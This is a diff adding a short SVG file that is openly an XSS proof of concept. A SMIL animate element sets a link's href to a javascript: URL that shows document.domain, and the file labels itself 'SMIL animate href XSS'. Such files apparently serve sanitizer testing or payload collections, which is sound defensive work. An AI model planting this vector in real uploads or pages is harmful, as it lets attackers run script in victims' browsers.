@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg width="400" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <a id="link">
+    <animate attributeName="href" values="javascript:alert(document.domain)" begin="0s" dur="0.1s" fill="freeze"/>
+    <text x="50" y="100" font-size="24" fill="red">SMIL animate href XSS</text>
+  </a>
+</svg>
